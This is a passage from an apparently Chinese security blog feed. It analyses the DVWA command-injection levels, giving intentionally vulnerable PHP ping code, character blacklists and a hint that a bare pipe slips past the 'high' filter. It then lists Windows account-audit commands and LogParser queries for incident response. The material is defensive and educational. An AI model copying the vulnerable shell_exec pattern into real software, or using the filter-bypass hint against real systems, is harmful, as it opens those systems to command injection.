<h4 id="4-防御策略"><a href="#4-防御策略" class="headerlink" title="4. 防御策略"></a>4. 防御策略</h4><p>过滤管道符：|，&amp;，；，||，&amp;&amp;符号替换为空格或者检测到时便停止程序</p>
<h4 id="5-防御-low"><a href="#5-防御-low" class="headerlink" title="5. 防御 low"></a>5. 防御 low</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>未做任何的过滤</p>
<h4 id="6-防御-medium"><a href="#6-防御-medium" class="headerlink" title="6. 防御 medium"></a>6. 防御 medium</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the characters in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只对&amp;&amp;和；做了防御</p>
<h4 id="7-防御-high"><a href="#7-防御-high" class="headerlink" title="7. 防御 high"></a>7. 防御 high</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the characters in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>单纯进行了拓宽，效果不好，注意“| ”后是有一个空格的，“|”不带空格的拦截不了，开发时注意</p>
<h4 id="8-防御-impossible"><a href="#8-防御-impossible" class="headerlink" title="8. 防御 impossible"></a>8. 防御 impossible</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>重点是其中的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>	<span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line"><span class="comment">// Split the IP into 4 octects</span></span><br><span class="line"><span class="number">2</span>    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line"><span class="number">3</span>    <span class="keyword">if</span>( ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line"><span class="number">4</span>        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br></pre></td></tr></table></figure>

<p>1.将用户输入中的反斜线去掉，防止转义字符</p>
<p>2.将输入的Ip按照”.”分开</p>
<p>3.判断分开的每个部分是不是都是数字并且总的数量为4</p>
<p>4.再将4个部分的数字用三个“.”给拼接起来</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/%E8%B4%A6%E6%88%B7%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<p>title: 账户安全<br>date: ‎2023-7‎-‎15‎ 16:42:23<br>tags: [账户安全]<br>categories: [账户安全]</p>
<h3 id="1-账户安全"><a href="#1-账户安全" class="headerlink" title="1. 账户安全"></a>1. 账户安全</h3><h4 id="1-系统命令排查用户情况"><a href="#1-系统命令排查用户情况" class="headerlink" title="1. 系统命令排查用户情况"></a>1. 系统命令排查用户情况</h4><ul>
<li>query user：查看当前登录账户</li>
<li>logoff ID：注销用户ID</li>
<li>net user：查看用户</li>
<li>net user username：查看某个用户的登录情况</li>
<li>Iusrmgr.msc：打开本地的用户组</li>
</ul>
<p>一般用于服务器端，本机客户端有些命令不存在</p>
<span id="more"></span>



<h4 id="2-注册表查看隐藏账号"><a href="#2-注册表查看隐藏账号" class="headerlink" title="2. 注册表查看隐藏账号"></a>2. 注册表查看隐藏账号</h4><p>打开注册表，在“计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”这个目录下可以查看所有的用户，排查隐藏用户。</p>
<p>到某一步文件无法打开的时候，可以尝试给与查看的权限。</p>
<h4 id="3-利用Log-Paeser查看日志"><a href="#3-利用Log-Paeser查看日志" class="headerlink" title="3. 利用Log Paeser查看日志"></a>3. 利用Log Paeser查看日志</h4><p>可以在事件管理器中导出所有的用户登录信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure>

<h4 id="4-webshell的查杀"><a href="#4-webshell的查杀" class="headerlink" title="4. webshell的查杀"></a>4. webshell的查杀</h4>]]></content>
  </entry>
</search>
